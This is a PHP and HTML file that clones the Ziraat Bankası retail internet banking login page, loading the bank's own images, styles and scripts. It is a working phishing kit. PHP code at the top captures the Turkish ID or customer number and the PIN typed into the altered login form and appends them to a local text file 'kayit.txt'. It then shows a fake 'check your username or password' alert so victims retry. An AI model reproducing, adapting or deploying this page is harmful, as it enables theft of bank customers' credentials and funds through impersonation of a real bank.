<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {

$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n __________________ \nUsername: ".$username."\nPassword: ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}
 ?>

<html class="login js webkit chrome"><head><style class="vjs-styles-defaults">
      .video-js {
        width: 300px;
        height: 150px;
      }

      .vjs-fluid {
        padding-top: 56.25%
      }
    </style>
    <meta http-equiv="Content-Language" content="tr">
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-9">
    <meta name="description" content="">
    <meta name="keyword" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    

    <link rel="icon" href="https://bireysel.ziraatbank.com.tr//Content/assets/img/touch_icon.png">
    <link rel="apple-touch-icon" href="https://bireysel.ziraatbank.com.tr//Content/assets/img/touch_icon.png">
    <link rel="apple-touch-startup-image" href="https://bireysel.ziraatbank.com.tr//Content/assets/img/ziraat_splash.jpg">
    <meta name="apple-mobile-web-app-title" content="Hoşgeldiniz | Ziraat Bankası İnternet Bankacılığı ">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="mobile-web-app-capable" content="yes">

    <title>Hoşgeldiniz | Ziraat Bankası İnternet Bankacılığı </title>
    
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<link href="https://bireysel.ziraatbank.com.tr/plugins.min.css?v=0WnwC10Ui67Cf0vF6vDueNbrbYjKGUAdzIZoal3Akf81" rel="stylesheet">


    <script type="text/javascript">
        var relativePath = '/'; 
    </script>
    <noscript>
        <meta http-equiv="refresh" content="0;URL=https:/bireysel.ziraatbank.com.tr/CommonPages/JavascriptWarning.aspx" />
    </noscript>
    <link href="https://bireysel.ziraatbank.com.tr/sub.min.css?v=YkdRwyOjRSfCa83cc15JP573ES9rMXLzmOdKZ7Xao6c1" rel="stylesheet">

    <script src="https://bireysel.ziraatbank.com.tr/jquery.js?v=VNuNukmpEeCUlsRELz3BBBsrVHOn6se6Z2jYD4PtEdQ1"></script>

    <script type="text/javascript">
        
    </script>
    
</head>
<body class="login-page">
    
    <!--[if IE 7]>
      <div class="ie-warning-band">
         <p>
            
            
         </p>
      </div>
      <![endif]-->
    <!--[if IE 8]>
      <div class="ie-warning-band">
         <p>
            
            
         </p>
      </div>
      <![endif]-->
    <script language="JavaScript" type="text/javascript">
        var sid = "";
        var is_DefaultSubmit = false;
    </script>
    <!-- scripts -->
    <form name="aspnetForm" method="post" action="">
<div>
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
<input type="hidden" name="__VSTATE" id="__VSTATE" value="H4sIAAAAAAAEANVVTW/TQBAlTtyklBJxibiQBFFIkeI4pYh+KSCSForol9KKAxdrbU/sJZtds7tukv4MfgXcEX8P1naSJqTiUIkiJGvsWc/svvdmPP6Zyt9P6UXLajEqOSOiDZ9DzOGECdlETvc9DC2rkNbLjiT1+oqz0gaJMGlDD3o28ENo+eB0m2ygP56NOGQ2JnCKPYpkyC/DHo3DWowHjCMJ83vl9dvG5np9c+3F1tbzvFvQOpHRsrHNKbugpZTNxFYb2Ww+X9CKmTMYSD27d/T24N3pvutq6UlIFB45xYzPoaO//ITOkXA4DuS2ZblszHi1kiA8YB6m+4Bc4JVqJfaUYc1QSkYrT6d3HtmOQpAp5lpCtAgSQn+AHUaNXigkcGwoNSQWuGf0gHfhAhcz1sPTpqYpjPoMxuRZbVXS9LskOtew2aBMGPVKaRU/OTQdJ2gzCQvIkfgc4kA31iozeZeXyDawhF55KqhwZ+pIrbh4iAYHQD3pa0uRu0cdPgwkuFMwo1tJVwuLcUr2g6JlE/DVytIE2GjD0i1QIcuIY2TwpLVcPSN5CK6Wj9OXj2mLYKBSWaerf031MXVZv8YCoKsV84wjKiK8jArzmBJMwdyFDgqJrCERDF7JARWNNgiQJ5g+cZTaTCl8NgygwSVRpbNsgmi3Ui1XhFS9KBpDEFVVeEaIjXjichD4AikSsdfHrvQba2sb9aoP2PNlY+PZeuXpTpmD6mVa7iAiYEfRvTeiGxHN6d+uBT158ToIbhh7VKTcZe3HNZ0rcvb3heUruzUS4Pu1BHjDuMdka0T+KIxmwT/Q4pLGf9WC6en5Ez1qc+XRR7x+zPLypQy2TbPf79cuMEdI1hzWq0luqqupvtOhAGLuMo+HLqJNhR85mOCueYI8EObHOCWe8rEIN8FyTOTLPBExYmIrBF3EJ1zGvtGLkP5dkNkpzbPJ8Lv6T6TNVi2Zzn/+WyQD/RctGkOUrgcAAA==">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="">
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['aspnetForm'];
if (!theForm) {
    theForm = document.aspnetForm;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>


<script src="/WebResource.axd?d=SqZa8GYeN-voTRZ-GMsb11KKLzsM4GjYxTGAXg23ajVoLdblDojATKR_7aSBdwvGYc1HUN_gkQjb5mtE0&amp;t=636765571264470882" type="text/javascript"></script>

<script language="javascript">
$(document).keydown(function(e){var t;if(e.keyCode==8){var n=e.srcElement||e.target;if(n.tagName.toUpperCase()=="INPUT"||n.tagName.toUpperCase()=="TEXTAREA"){t=n.readOnly||n.disabled}else t=true}else t=false;if(t)e.preventDefault()})

</script>
<script src="/WebResource.axd?d=agHyoqmM5R2HZK0hGHfDVytXXsb63ddjF_nKao5XovSnHZhjS6or_fp52iypVd59PLxUB0lM_JvLk5XHaiBfD53SBAg1&amp;t=636765571264470882" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
var dd5fcb6461304a64adbfb0462736cb6f=['1024','010001','DA61C1FC46DED7C251C4FE317A09E5B9BD587A99843102E5966325778BA9850405F087C1E371231636A0541F81297591D01194886EF82490078EA833FEC0041698429C85805A34E292E98FA0B5E2C69E75BDC88EBD27304AF081D04C85B2DAB590FB4547517DB52EEBC00A68FE1E125E362BBDE7208801E01005A3BF6C13B5E3'];var dd5fcb6461304a64adbfb0462736cb6f=['1024','010001','DA61C1FC46DED7C251C4FE317A09E5B9BD587A99843102E5966325778BA9850405F087C1E371231636A0541F81297591D01194886EF82490078EA833FEC0041698429C85805A34E292E98FA0B5E2C69E75BDC88EBD27304AF081D04C85B2DAB590FB4547517DB52EEBC00A68FE1E125E362BBDE7208801E01005A3BF6C13B5E3'];function WebForm_OnSubmit() {
if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;EncryptFormInputs();
return true;
}
//]]>
</script>

<div>

  <input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
  <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="Ycq2aeW6oKN2flTedVBxzVnh7RvNj4C6IuiDk9Swsjpa1MPLEuaEnho9zm8NBQiFE7pFLSVEysfdtW6EBr4JwD0kWx1XfBvpWF7N+tv4zveXQlJO8aM6I36WN3fA0Yb4IsH37tCM4cpIwXKxndGHvbqmTu/MHNlkI+s8dQYntu0iDXmHiq5qQ8YNd9OMCdQMi8G1UaCr30GXmpPs7hwvzDEbzkkyPRvGGzCixd69pqj1GKli5uP1q+rGze+j+15GppxL0Bms/q6RSfbzBRpMfj9Mo9cjBCTSfJHUE6dUbDe0JZP48x8/28BuriDe3WsW2+IE+5+EshGOpTS4csj3SL9kYDaRsEhXguOqDddzzKGsIsRxsFDyONe3T5uj+NhRN3KhOEjj6ZBU6R0aTTxn+dDggccd6ADJWOnAieS7XCz8ybBIG1dBj7vTef8s1UF1xTW03rY8TPt2isPhX5/o+k+0ZAve/Snt3qzn9SxEagtNENhtFl4d7fVA5x9Hat/jus04mA+jWG9oMi5sFlg2f0xZS2/EjNK5a4zH8fIw+RyMKQud3nqf14tTDUuznZxNV9o/bO7xgSoXY2TyVlcq60aVlBtvhxUqXEs2Crs5xGHNezrcTefEuLlLatyaAQolAqCo5CF6hopIsMIIweOWTYG7doOMcC8NN6ALablmrZcvkP5MXKSfB54l9MFQ8y/pVM/QZ9fxAVhMbOall0ctywwuX4FdVtoQVC/4+GmmFITHNxfK28TreEXXfFLBrjvdSggd7zZFP0rsldW8HrOeetRnc6CK16PYh2jmQ+O8bEW7yp3gTVV47Gpcl5+Fhl8yg3eFAMNHeqIFSO7KOxDibeXLxHfcgy41AAtlbVt02tQ5Qr2Q/ezP8IGFIOV5jwWvCV35ob4hKtVktxuPzRjQ/TB7ICiN5NPP83HP5TmZGcOrnuH1dbbavmWyAx1nuEHDnMDgiSun5IZaldtTgQdl27+/TsGxCMhFkJJwVw==">
</div>
         <input type="hidden" name="ctl00$TabInstanceUniqueKey" id="TabInstanceUniqueKey">
        <script type="text/javascript">
            VeriBranch.CheckTabInstance('/navigationcontroller.aspx?page=Logoff');
        </script>
        
        <input type="hidden" name="ctl00$NavigationHiddenInput" id="NavigationHiddenInput">
         <input type="hidden" name="ctl00$HdnClientParametersCacheKey" id="HdnClientParametersCacheKey" value="b8c7e10445a24531af490f0fed34d5a5">
         <input type="hidden" name="ctl00$HdnCurrentCulture" id="HdnCurrentCulture" value="tr">
        <input type="hidden" name="ctl00$HiddenIsIOSDevice" id="HiddenIsIOSDevice" value="False">
        <input type="hidden" name="ctl00$HdnBaseUrl" id="ctl00_HdnBaseUrl" value="//bireysel.ziraatbank.com.tr">

        <a causesval="false" onclick=";;;" id="NavigationHiddenButton" href="javascript:__doPostBack('ctl00$NavigationHiddenButton','')" style="display: none;"><span></span></a>
        <div id="" class="login-wrap">
  
            
<header>
   <div id="ButtonContainer" class="top hidden-xs">
    
      <div id="" class="container">
      
         <a causesval="false" onclick=";;;" id="ctl00_LoginHeader_SecurityButton" href="javascript:__doPostBack('ctl00$LoginHeader$SecurityButton','')"><span></span>GÜVENLİK</a>
         <a causesval="false" onclick=";;;" id="ctl00_LoginHeader_HelpButton" href="javascript:__doPostBack('ctl00$LoginHeader$HelpButton','')"><span></span>YARDIM</a>
         <a causesval="false" onclick=";;;" id="ctl00_LoginHeader_FaqButton" href="javascript:__doPostBack('ctl00$LoginHeader$FaqButton','')"><span></span>SIKÇA SORULAN SORULAR</a>
         <a causesval="false" onclick="return ($.isFunction(firstLoginWithCulture) ? firstLoginWithCulture() : true);;;;" id="ctl00_LoginHeader_BtnLanguage" href="javascript:__doPostBack('ctl00$LoginHeader$BtnLanguage','')"><span></span>ENGLISH</a>
      
    </div>
   
  </div>
   <div id="" class="bottom">
    
      <div id="" class="container">
      
         <a id="LoginLogoButton" class="logo" href="javascript:__doPostBack('ctl00$LoginHeader','LoginLogoButton')" causesval="false">
             
            <span id="" class="clearfix">
               <i id="" class="icon-logo-ico"></i>
               <i id="" class="icon-logo-text"></i>
            </span>
         </a>
         <ul id="" class="contact hidden-xs">
        
            <li id="" class="call-center">
                <a id="LogoButton" class="icon-musteri-iletisim-merkezi" href="tel:08502200000">
                    
                </a>
       
            </li>
         
      </ul>
      
    </div>
   
  </div>
</header>
            <div id="" class="bg-layer">
    
            
  </div>
            <div id="" class="container">
    
               <div id="ctl00_ctl05" class="row">
                  <div id="ctl00_LoginBoxContainer" class="col-xs-12 col-md-6">
                     <div id="LoginBox" class="login-box long">
      
                        
    <span id="ctl00_c_PageValidation" style="color:Red;visibility:hidden;"></span>
    <script>
      
        function ValidateIdentity(input) {
            if ($(input).hasClass("from-cookie")) {

            }
            else if ($(input).is(':visible')) {
                var value = $(input).val();
                if (value && value.length > 0) {
                    var regx = new RegExp("^[0-9]+$");
                    if (!regx.test(value)) {
                        return GetValidationMsg($(input), 'Müşteri / T.C. Kimlik Numaranızı Yalnızca Rakam Olarak Giriniz');
                    }
                }
                return CheckCustomerNumberTCKN();
            }
    }

    function CheckCustomerNumberTCKN() {
        var field = $("#ctl00_c_RetailIdentityTextBox");
        var customerInput = $("#ctl00_c_RetailIdentityTextBox").val();
          
        if (customerInput.length > 8 && customerInput.length < 11) {
            return 'Müşteri / T.C. Kimlik Numaranızı Kontrol Ediniz.';
        }
          
        var reqMsg = field.attr('ReqFieldMsg');
        var haveValue = field.hasClass('have-value');
        var value = haveValue ? field.val() : '';

        if (reqMsg != undefined && value == "") {
            return GetValidationMsg(field, reqMsg);
        }
        var numInputMsg = field.attr('ReqNumMsg');
        if (numInputMsg != undefined && isNaN(value)) {
            return GetValidationMsg(field, numInputMsg);
        }

        var lengthMsg = field.attr('LengthMsg');
        var maxLength = eval(field.attr('ReqMaxLength'));
        if (lengthMsg != undefined && value.length != maxLength) {
            return GetValidationMsg(field, lengthMsg);
        }

        var rangeMsg = field.attr('RangeValidMsg');

        if (rangeMsg != undefined) {
            var rangeType = field.attr('RangeValType');
            var rangeMin = eval(field.attr('RangeMin').replace(/\./g, '').replace(/\,/g, '.'));
            var rangeMax = eval(field.attr('RangeMax').replace(/\./g, '').replace(/\,/g, '.'));
            var fieldValue = parseFloat(value.replace(/\./g, '').replace(/\,/g, '.'));
            if (rangeType == 'strln' && (rangeMin > value.length || value.length > rangeMax)) {
                return GetValidationMsg(field, rangeMsg);
            }
            if (rangeType == 'num') {
                var hasError = false;

                if ((rangeMin == 0 && fieldValue < 0.01) || (rangeMin != 0 && fieldValue < rangeMin))
                    hasError = true;
                if (rangeMax != 0 && fieldValue > rangeMax)
                    hasError = true;
                if (hasError)
                    return GetValidationMsg(field, rangeMsg);
            }
        }
    }
    </script>
    <input name="rdLng" type="hidden" value="">
    <input type="hidden" name="ctl00$c$CookieEditStatusField" id="ctl00_c_CookieEditStatusField" value="false">
    <p>İnternet Şubemize Hoş Geldiniz</p>
    

<div class="tabs-wrap" data-module="14">
        
         
         <div id="TabHeaderContainer" class="tabs tab-header-container">
          
            <a causesval="false" onclick=";;;" id="ctl00_c_RetailTabHeaderButton" class="active" href="javascript:__doPostBack('ctl00$c$RetailTabHeaderButton','')"><span></span>BİREYSEL</a>
            
         
        </div>
         
         
         <div id="" class="tab-container tab-contents">
          
            <div id="RetailTabContainer" class="tab-item active">
            <form action="" method="POST">             

             <div id="ctl00_c_RetailIdentityContainer" class="form-group hidden-title">
                  <input name="login" type="tel" maxlength="11" class="form-control required isNumber numeric external-validation" placeholder="T.C. Kimlik / Müşteri Numaranız">
               </div>
               <div id="RetailRememberMeContainer" class="clearfix">
              
                  <div role="button" class="switch-cont" tabindex="0">
                <span>Beni Hatırla</span><label class="switch"><input id="ctl00_c_RetailRememberMeCheckBox" type="checkbox" name="ctl00$c$RetailRememberMeCheckBox" causesval="false" tabindex="-1" aria-hidden="true"><span class="switch-slider"></span></label>
              </div>
               
            </div>
               <div id="ctl00_c_RetailPinContainer" class="form-group hidden-title">
                  <input name="password" type="password" maxlength="6" class="form-control required pin-entry isAlphaNumericForPin external-validation" placeholder="Şifre">
               </div>
               <div id="" class="clearfix">
              
                  <div role="button" class="switch-cont" tabindex="0">
                <span for="ctl00_c_RetailMobileSignatureCheckBox" class="">Mobil İmza İle Giriş<a href="javascript:;" data-toggle="popover" data-original-title="Bu hizmetten sadece Turkcell hatlı bireysel müşterilerimiz yararlanabilir." role="button" tabindex="0" aria-haspopup="true" aria-expanded="false"><i class="icon-aciklama"></i></a></span><label class="switch"><input id="ctl00_c_RetailMobileSignatureCheckBox" type="checkbox" name="ctl00$c$RetailMobileSignatureCheckBox" causesval="false" tabindex="-1" aria-hidden="true"><span class="switch-slider"></span></label>
              </div>
               
            </div>
                  
               
               <div id="" class="btns">
              
                  <button class="btn btn-danger sendBtn">DEVAM</button>
               
            </div>



                   <a causesval="true" onclick="window.open('/Transactions/Online/Default.aspx?txns=ResetPin&amp;customerType=rtl','_blank', 'status=yes,scrollbars=yes,resizable=yes,width=1170,height=723'); return false;;;;" id="ctl00_c_RetailRemindPinButton" class="custom-link" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$c$RetailRemindPinButton&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, true))"><span></span>Şifremi Unuttum</a>
               <div id="" class="tab-footer">
              
                  <p>Dijital Bankacılık müşterimiz olmak için</p>
                  <a causesval="true" onclick="window.open('/Transactions/Online/Default.aspx?txns=OnlineApp&amp;customerType=rtl','_blank', 'status=yes,scrollbars=yes,resizable=yes,width=1170,height=723'); return false;;;;" id="ctl00_c_OnlineApplicationButton" class="btn btn-default " href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$c$OnlineApplicationButton&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, true))"><span></span>HEMEN BAŞVUR</a>
               
            </div>
            
          </div>


        </form>
            <div id="CorporateTabContainer" class="tab-item" style="display: none;">
            
               <div id="ctl00_c_ctl18" class="form-group hidden-title">
                  <span class="placeholder" style="box-sizing: border-box; padding: 9px 20px; margin: 0px 0px 10px; border-width: 1px; line-height: normal; font-size: 14px; font-family: &quot;Gotham Narrow&quot;; width: 100%; height: 40px; top: auto; left: auto; right: auto; bottom: auto; cursor: text; display: block; position: absolute; overflow: hidden; z-index: 2; background: none; border-style: solid; border-color: transparent;"><em style="display:table;width:100%;height:100%;"><em style="display:table-cell;vertical-align: middle;false">Müşteri Numaranız</em></em></span><input autocomplete="off" name="ctl00$c$CorporateIdentityTextBox" type="tel" maxlength="8" id="ctl00_c_CorporateIdentityTextBox" class="form-control required isNumber numeric external-validation" maxlengthvalidationcharactercount="0" placeholder="" data-msg-required="Müşteri Numaranızı Giriniz" maxlengthvalidationenabled="False" onpaste=";" ondrop="return DisableDragAndDrop(event);" disablevalidationonblur="true" onkeypress=";" onkeydown=";" onkeyup=";;" onmouseup=";" causesval="false" onmousedown=";" encrypted="" exvalidmethod="ValidateIdentity" aria-required="true"><input type="hidden" name="ctl00$c$CorporateIdentityTextBoxdd5fcb6461304a" id="ctl00_c_CorporateIdentityTextBoxdd5fcb6461304a">
               </div>
               <div id="CorporateRememberMeContainer" class="clearfix">
              
                  <div role="button" class="switch-cont" tabindex="0">
                <span>Beni Hatırla</span><label class="switch"><input id="ctl00_c_CorporateRememberMeCheckBox" type="checkbox" name="ctl00$c$CorporateRememberMeCheckBox" causesval="false" tabindex="-1" aria-hidden="true"><span class="switch-slider"></span></label>
              </div>
                  
               
            </div>
               <div id="ctl00_c_ctl19" class="form-group hidden-title">
                  <span class="placeholder" style="box-sizing: border-box; padding: 9px 20px; margin: 0px 0px 10px; border-width: 1px; line-height: normal; font-size: 14px; font-family: &quot;Gotham Narrow&quot;; width: 100%; height: 40px; top: auto; left: auto; right: auto; bottom: auto; cursor: text; display: block; position: absolute; overflow: hidden; z-index: 2; background: none; border-style: solid; border-color: transparent;"><em style="display:table;width:100%;height:100%;"><em style="display:table-cell;vertical-align: middle;false">Şifre</em></em></span><input autocomplete="off" name="ctl00$c$CorporatePinTextBox" type="password" maxlength="6" id="ctl00_c_CorporatePinTextBox" class="form-control required pin-entry isAlphaNumericForPin external-validation" onmousedown=";" data-rule-range-min="5" placeholder="" data-msg-required="Lütfen şifrenizi giriniz." onmouseup=";" onpaste="return false;;return false;return false;" ondrop="return DisableDragAndDrop(event);" disablevalidationonblur="true" data-rule-range-max="6" onkeypress=";" onkeydown=";return FcsToCtrl(event,'ctl00_c_CorporateLoginButton');" onkeyup=";;" causesval="false" pin-validation-message-current-pin-length="Şifrenizi kontrol ediniz." encrypted="" exvalidmethod="CheckAlphaNumericCurrentPinEntry" aria-required="true"><input type="hidden" name="ctl00$c$CorporatePinTextBoxdd5fcb6461304a" id="ctl00_c_CorporatePinTextBoxdd5fcb6461304a">
               </div>
               <div id="ctl00_c_ctl20" class="form-group hidden-title">
                  <span class="placeholder" style="box-sizing: border-box; padding: 9px 20px; margin: 0px 0px 10px; border-width: 1px; line-height: normal; font-size: 14px; font-family: &quot;Gotham Narrow&quot;; width: 100%; height: 40px; top: auto; left: auto; right: auto; bottom: auto; cursor: text; display: block; position: absolute; overflow: hidden; z-index: 2; background: none; border-style: solid; border-color: transparent;"><em style="display:table;width:100%;height:100%;"><em style="display:table-cell;vertical-align: middle;false">Kullanıcı Adınız</em></em></span><input autocomplete="off" name="ctl00$c$CorporateUserNameTextBox" type="text" maxlength="10" id="ctl00_c_CorporateUserNameTextBox" class="form-control required" maxlengthvalidationcharactercount="0" placeholder="" maxlengthvalidationenabled="False" onpaste=";" ondrop="return DisableDragAndDrop(event);" onkeypress=";" onkeydown=";return FcsToCtrl(event,'ctl00_c_CorporateLoginButton');" onkeyup=";;" onmouseup=";" causesval="false" onmousedown=";" encrypted="" aria-required="true"><input type="hidden" name="ctl00$c$CorporateUserNameTextBoxdd5fcb6461304a" id="ctl00_c_CorporateUserNameTextBoxdd5fcb6461304a">
               </div>
                 
               <div id="" class="btns">
              
                  <a causesval="true" onclick=";;;" id="ctl00_c_CorporateLoginButton" class="btn btn-danger sendBtn" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$c$CorporateLoginButton&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, true))"><span></span>DEVAM</a>
               
            </div>
                   <div id="" class="clearfix">
              
                       <div id="ctl00_c_ctl27" class="row">
                           <div id="ctl00_c_ctl28" class="col-xs-7">
                               <a causesval="true" onclick="window.open('/Transactions/Online/Default.aspx?txns=ForgotCustomerNumber&amp;customerType=rtl','_blank', 'status=yes,scrollbars=yes,resizable=yes,width=1170,height=723'); return false;;;;" id="ctl00_c_CorporateRemindCustomerNumberButton" class="custom-link text-left" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$c$CorporateRemindCustomerNumberButton&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, true))"><span></span>Müşteri Numaramı Unuttum</a>
                           </div>
                           <div id="ctl00_c_ctl29" class="col-xs-5">
                               <a causesval="true" onclick="window.open('/Transactions/Online/Default.aspx?txns=ResetPin&amp;customerType=rtl','_blank', 'status=yes,scrollbars=yes,resizable=yes,width=1170,height=723'); return false;;;;" id="ctl00_c_CorporateRemindPinButton" class="custom-link pull-right" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$c$CorporateRemindPinButton&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, true))"><span></span>Şifremi Unuttum</a>
                           </div>
                       </div>
                      
                  
                       
               
            </div>
            
          </div>
         
        </div>
    
      </div>

    <div id="" class="">
        
        <div id="ctl00_c_LbSMSOption" class="modal fade custom-modal-view" role="modal">
<div class="modal-dialog ">
   <!-- Modal content-->
   <div class="modal-content">
      <div class="modal-header">
                         <h4 class="modal-title"></h4>
               <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <i class="icon-basarisiz"></i>
         </button>
                      </div>
         <div class="modal-body">
                   <div>
  
                         Ziraat Onay bağlantısına ulaşılamadığından, geçici olarak SMS ile doğrulama yapmanız gerekmektedir.
            
</div>
                 </div>
           <div class="modal-footer ">
          <div>
  
                <div id="ctl00_c_LbSMSOption_ctl03" class="row">
                    
                    <div id="ctl00_c_LbSMSOption_ctl04" class="col-xs-6 col-sm-6 col-md-6 col-lg-6">
                          <a causesval="false" onclick="CloseSMSOptionLb();return false;;;;;" id="ctl00_c_LbSMSOption_BtnClose" class="btn btn-default " href="javascript:__doPostBack('ctl00$c$LbSMSOption$BtnClose','')"><span></span>İPTAL</a>
                    </div>
                    <div id="ctl00_c_LbSMSOption_ctl05" class="col-xs-6 col-sm-6 col-md-6 col-lg-6">
                        <a causesval="false" onclick=";;;" id="ctl00_c_LbSMSOption_BtnOK" class="btn btn-danger " href="javascript:__doPostBack('ctl00$c$LbSMSOption$BtnOK','')"><span></span>TAMAM</a>
                    </div>
                </div>
            
</div>
       
   </div>
</div>
</div>
</div>

    
      </div>
    <div class="logout-wrap unsupported-browser none" style="margin-top: 177px;">
        <i class="icon-logo-ico"></i>
        <h1 id="" class="">
        
         Kullanmakta olduğunuz tarayıcı Yeni İnternet Şubemizin bazı özelliklerini desteklememektedir.
        
      </h1>
    </div>


    <script type="text/javascript">
        function RestorePlaceholder() {

            $.each($('input[type=text][placeholder],input[type=tel][placeholder], input[type=password][placeholder]'), function () {
                var $input = $(this);
                if (!$input.is(':focus') && $input.val().length == 0) {
                    $input.prev('span.placeholder').css('display', 'block');
                }
            });

        }
        $(document).ready(function () {
            $('input[type=text], input[type=tel]').keypress(function (e) {
                if (e.which == 13) {
                    loginSubmit();
                    e.preventDefault();
                    return false;
                }
            });
            setTimeout(function () {
                var rememberMe = $("#ctl00_c_RetailRememberMeCheckBox");
                if (rememberMe.is(':visible') && rememberMe.is(':checked')) {
                    rememberMe.on('change', function () {
                        if (!rememberMe.is(':checked')) {
                            //removeCookies();
                            $('input[type=text].from-cookie, input[type=tel].from-cookie').val('');

                            RestorePlaceholder();
                            if (!VeriBranch.IsMobileDevice())
                                $(identity[0]).focus();
                        }
                    });
                }
            }, 100);
            var cookieInputs = $('input[type=text].from-cookie, input[type=tel].from-cookie');
            cookieInputs.on('paste keypress input', function (event) {
                var $this = $(this);
                if ($this.hasClass('from-cookie')) {
                    //rememberMe.removeAttr('checked');
                    //removeCookies();
                    if ($this.hasClass('keepCookies')) {
                        $this.val('');
                        RestorePlaceholder();
                    }
                    else {
                        $('input[type=text].from-cookie, input[type=tel].from-cookie').val('');

                        RestorePlaceholder();
                        $('#ctl00_c_CookieEditStatusField').val('true');
                    }
                }
                if ($this.hasClass('keepCookies')) {
                    $this.removeClass('from-cookie');
                }
                else {
                    cookieInputs.removeClass('from-cookie');
                }
            });


            var identity = $('#ctl00_c_RetailIdentityTextBox');
            var pin = $('#ctl00_c_RetailPinTextBox');

            identity.bind('contextmenu', function (e) {
                return false;
            });
            pin.bind('contextmenu', function (e) {
                return false;
            });



            setTimeout(function () {
                var hasCookie = Cookies.get('RetailZTLoginCookie') != undefined;
                var $identity = $(identity[0]);
                var hasIdentity = $identity.val() != '' && ($identity.attr('placeholder') != $identity.val());
                if ($identity.val().length > 0 && (hasCookie || hasIdentity)) {
                    $(pin[0]).focus();
                }
                else {
                    $identity.focus();
                }
            }, 100);

        });
        function removeCookies() {
            Cookies.remove('RetailZTLoginCookie');
            Cookies.remove('RetailZTLoginCookie', { path: '' });
        }
        function setIdentity(clientId, identityValue) {
            $('#' + clientId).val(identityValue);
        }

        function ValidatePage(sender, args) {
            ShowLoginLoading();
        }
        function loginDummyLoading() {
            var $loadingPanel = $('.loadingPanel');
            if ($loadingPanel.is(':visible')) {
                return;
            }
            $loadingPanel.show();
            $(".preloader-box1").show();
        }


    </script>
    <input type="hidden" name="ctl00$c$HiddenField1" id="ctl00_c_HiddenField1" value="07">

                     
    </div>
                  </div>
                  <div id="ctl00_LoginInfoBoxContainer" class="col-xs-12 col-md-6">
                     <div id="" class="login-info-box" data-module="15" style="opacity: 1;">
      
   
   <div id="" class="body">
        
      <div id="" class="banner slider login-banner owl-loaded owl-drag" role="listbox" tabindex="0" data-owl-access-keyup="1" data-owl-carousel-focusable="1">
          
          
           
      
        <div class="owl-stage-outer"><div class="owl-stage" style="transform: translate3d(-1110px, 0px, 0px); transition: all 0.25s ease 0s; width: 2220px;"><div class="owl-item cloned" aria-hidden="true" style="width: 370px;"><div id="" class="item">
            
         <img src="http://www.ziraat.com.tr/Content/assets/img/phone.png" style="border-width:0px;">
         <p>Mobil uygulamamız ile<br>Ziraat Bankası hep yanınızda!</p>
         <a causesval="false" onclick="window.open('http://www.ziraat.com.tr/tr/Bireysel/DogrudanBankacilik/Pages/ZiraatMobil.aspx','_blank', 'status=yes,scrollbars=yes,resizable=yes,width=1170,height=723'); return false;;;;" id="ctl00_ctl06_DownloadMobileAppButton1" class="btn btn-default " href="javascript:__doPostBack('ctl00$ctl06$DownloadMobileAppButton1','')" tabindex="-1" data-owl-temp-tabindex="0"><span></span>HEMEN YÜKLE</a>
              
          </div></div><div class="owl-item cloned" aria-hidden="true" style="width: 370px;"><div id="" class="item">
            
         <img src="http://www.ziraat.com.tr/Content/assets/img/login/phone.png" style="border-width:0px;">
         <p>Mobil uygulamamız ile<br>Ziraat Bankası hep yanınızda!</p>
         <a causesval="false" onclick="window.open('https://www.bankkart.com.tr/bankkart-mobil','_blank', 'status=yes,scrollbars=yes,resizable=yes,width=1170,height=723'); return false;;;;" id="ctl00_ctl06_DownloadMobileAppButton2" class="btn btn-default " href="javascript:__doPostBack('ctl00$ctl06$DownloadMobileAppButton2','')" tabindex="-1" data-owl-temp-tabindex="0"><span></span>HEMEN YÜKLE</a>
              
          </div></div><div class="owl-item" aria-hidden="true" style="width: 370px;"><div id="" class="item">
            
         <img src="http://www.ziraat.com.tr/Content/assets/img/phone.png" style="border-width:0px;">
         <p>Mobil uygulamamız ile<br>Ziraat Bankası hep yanınızda!</p>
         <a causesval="false" onclick="window.open('http://www.ziraat.com.tr/tr/Bireysel/DogrudanBankacilik/Pages/ZiraatMobil.aspx','_blank', 'status=yes,scrollbars=yes,resizable=yes,width=1170,height=723'); return false;;;;" id="ctl00_ctl06_DownloadMobileAppButton1" class="btn btn-default " href="javascript:__doPostBack('ctl00$ctl06$DownloadMobileAppButton1','')" tabindex="-1" data-owl-temp-tabindex="0"><span></span>HEMEN YÜKLE</a>
              
          </div></div><div class="owl-item active" aria-hidden="false" style="width: 370px;"><div id="" class="item">
            
